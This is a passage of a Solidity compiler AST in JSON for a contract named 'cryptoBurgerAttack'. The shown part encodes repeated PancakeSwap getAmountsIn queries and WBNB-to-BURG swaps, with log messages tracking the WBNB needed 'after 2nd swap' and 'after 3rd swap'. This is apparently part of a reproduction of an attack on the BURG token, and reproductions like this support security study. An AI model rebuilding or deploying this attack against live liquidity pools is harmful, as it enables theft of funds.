                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 372,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "4037:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 373,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "4066:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 369,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "3990:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 368,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "3973:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 370,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "3973:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 371,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "3973:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 374,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "3973:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "3958:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 376,
                  "nodeType": "ExpressionStatement",
                  "src": "3958:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e20616674657220326e6420737761703a20",
                        "id": 378,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4112:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_423516c4b279a0d166fc38ba08f400f6e041a04b9d9961acc6300fb626a4fb5e",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 2nd swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 2nd swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 379,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "4188:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 381,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 380,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "4201:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "4188:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_423516c4b279a0d166fc38ba08f400f6e041a04b9d9961acc6300fb626a4fb5e",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 2nd swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 377,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "4095:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 382,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4095:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 383,
                  "nodeType": "EmitStatement",
                  "src": "4090:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 385,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4245:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 390,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "4318:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 389,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "4310:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 388,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "4310:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 391,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "4310:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 386,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "4285:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 387,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "4285:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 392,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4285:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 384,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "4228:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 393,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4228:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 394,
                  "nodeType": "EmitStatement",
                  "src": "4223:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 396,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "4352:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 397,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "4358:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 398,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "4366:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 400,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 399,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "4379:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "4366:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 401,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4383:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 406,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "4402:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 405,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "4394:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 404,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "4394:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 407,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "4394:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 403,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "4386:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 402,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "4386:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 408,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4386:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 395,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "4345:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 409,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4345:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 410,
                  "nodeType": "ExpressionStatement",
                  "src": "4345:64:0"
                },
                {
                  "expression": {
                    "id": 419,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 411,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "4419:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 416,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "4498:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 417,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "4527:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 413,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "4451:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 412,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "4434:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 414,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "4434:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 415,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "4434:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 418,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "4434:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "4419:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 420,
                  "nodeType": "ExpressionStatement",
                  "src": "4419:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722033726420737761703a20",
                        "id": 422,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4573:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_8987acd930371956b4ef740ba9364ac14855f5619f76936690d656d9b57efe70",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 3rd swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 3rd swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 423,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "4649:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 425,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 424,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "4662:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "4649:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_8987acd930371956b4ef740ba9364ac14855f5619f76936690d656d9b57efe70",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 3rd swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 421,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "4556:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 426,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4556:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 427,
                  "nodeType": "EmitStatement",
                  "src": "4551:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 429,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4706:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 434,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "4779:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 433,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "4771:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 432,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "4771:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 435,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "4771:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 430,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "4746:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 431,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "4746:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 436,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "4746:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 428,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "4689:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 437,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4689:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 438,
                  "nodeType": "EmitStatement",
                  "src": "4684:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 440,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "4812:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 441,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "4818:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 442,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "4826:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 444,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 443,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "4839:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "4826:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 445,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "4843:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 450,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "4862:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 449,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "4854:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 448,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "4854:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 451,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "4854:13:0",
